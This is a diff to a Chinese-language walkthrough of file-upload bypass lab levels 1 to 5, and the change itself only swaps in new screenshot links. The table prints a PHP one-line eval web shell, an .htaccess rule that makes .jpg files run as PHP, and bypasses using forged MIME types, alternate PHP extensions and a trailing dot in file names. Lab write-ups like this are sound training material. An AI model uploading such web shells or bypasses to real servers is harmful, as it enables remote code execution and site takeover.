@@ -15,9 +15,12 @@
 ### **Level 1-5: 基础校验绕过（前端/简单服务端过滤）**
 | 关卡 | 防护机制分析 | 有效Payload | 绕过原理 | 关键步骤与截图 |
 | :--- | :--- | :--- | :--- | :--- |
-| **Level 1** | 仅前端JavaScript校验文件扩展名（仅允许jpg/png/gif），服务端无任何校验 | `shell.php`（内容：`<?php @eval($_POST['pass']);?>`） | 禁用前端JS或Burp抓包直接绕过前端校验，服务端直接接收文件 | 1. 直接上传shell.php触发前端弹窗提示<br>2. F12禁用JavaScript后重新上传<br>![L1 禁用前端JS](./assets_upload/level1-disablejs.png) ![L1 上传成功](./assets_upload/level1-success.png) |
-| **Level 2** | 取消前端校验，服务端仅校验Content-Type（MIME类型），无扩展名/内容校验 | `Content-Type: image/jpeg` + 文件名`shell.php` | 抓包修改Content-Type为合法图片MIME类型，绕过服务端类型校验 | 1. 选择shell.php上传并通过Burp拦截请求<br>2. 将Content-Type修改为image/jpeg后转发<br>![L2 修改MIME类型](./assets_upload/level2-mime.png) |
-| **Level 3** | 服务端黑名单过滤.php/.asp/.jsp等常见脚本扩展名，Apache默认支持非主流PHP扩展名解析 | `shell.phtml`/`shell.php5`/`shell.php3` | 使用Apache可解析的非主流PHP扩展名，绕过服务端黑名单校验 | 1. 将恶意文件重命名为shell.phtml<br>2. 直接上传后访问文件路径<br>![L3 非主流扩展名](./assets_upload/level3-ext.png) |
+| **Level 1** | 仅前端JavaScript校验文件扩展名（仅允许jpg/png/gif），服务端无任何校验 | `shell.php`（内容：`<?php @eval($_POST['pass']);?>`） | 禁用前端JS或Burp抓包直接绕过前端校验，服务端直接接收文件 | 1. 直接上传shell.php触发前端弹窗提示<img width="1789" height="745" alt="image" src="https://github.com/user-attachments/assets/02403eee-e2b6-4ddb-8110-9fd02dbdbc03" />
+<br>2. F12禁用JavaScript后重新上传<br>1 禁用前端JS <img width="2189" height="890" alt="image" src="https://github.com/user-attachments/assets/0ef86f49-521a-4bad-a0ec-742c723b6d3f" />3.L1 上传成功<img width="845" height="690" alt="image" src="https://github.com/user-attachments/assets/c595b9cd-5e8d-4e2d-af28-de39d50e4897" /> |
+| **Level 2** | 取消前端校验，服务端仅校验Content-Type（MIME类型），无扩展名/内容校验 | `Content-Type: image/jpeg` + 文件名`shell.php` | 抓包修改Content-Type为合法图片MIME类型，绕过服务端类型校验 | 1. 选择shell.php上传并通过Burp拦截请求将Content-Type修改为image/jpeg后转发<img width="1774" height="1021" alt="image" src="https://github.com/user-attachments/assets/57b64772-1563-4d89-b57a-1ac661a4d4af" /><br>2.修改MIME类型上传成功 <img width="1444" height="795" alt="image" src="https://github.com/user-attachments/assets/ff1f5f2d-d310-47c1-8857-6295565f572c" />|
+| **Level 3** | 服务端黑名单过滤.php/.asp/.jsp等常见脚本扩展名，Apache默认支持非主流PHP扩展名解析 | `shell.phtml`/`shell.php5`/`shell.php3` | 使用Apache可解析的非主流PHP扩展名，绕过服务端黑名单校验 | 1. 将恶意文件重命名为shell.phtml<img width="669" height="406" alt="image" src="https://github.com/user-attachments/assets/86976ec6-f642-4bf8-802a-730fcfba355d" />
+<br>2. 直接上传后访问文件路径<img width="1654" height="680" alt="image" src="https://github.com/user-attachments/assets/9e87fabc-ef73-4e95-8bcc-6587c7ab617f" />
+<br>3. 非主流扩展名<img width="660" height="384" alt="image" src="https://github.com/user-attachments/assets/95f535ec-5c53-444d-a98a-3c69726ba635" />|
 | **Level 4** | 黑名单拦截所有PHP相关扩展名，未严格拦截.htaccess配置文件 | `.htaccess`（内容：`AddType application/x-httpd-php .jpg`）+ `shell.jpg`（图片马） | 上传.htaccess配置文件，让服务器将任意.jpg文件解析为PHP代码 | 1. 先上传编写好的.htaccess文件<br>2. 上传jpg格式图片马后访问执行<br>![L4 上传.htaccess](./assets_upload/level4-htaccess.png) |
 | **Level 5** | 黑名单过滤完善，未处理Windows系统文件命名特性——文件名末尾加英文半角点 | `shell.php.`（末尾带英文半角点） | 利用Windows系统特性，服务端会自动去除文件名末尾的英文点，还原为合法PHP文件 | 1. 将恶意文件命名为shell.php.（末尾加点）<br>2. 直接上传，服务端自动处理后保存为shell.php<br>![L5 文件名末尾加点](./assets_upload/level5-point.png) |
 
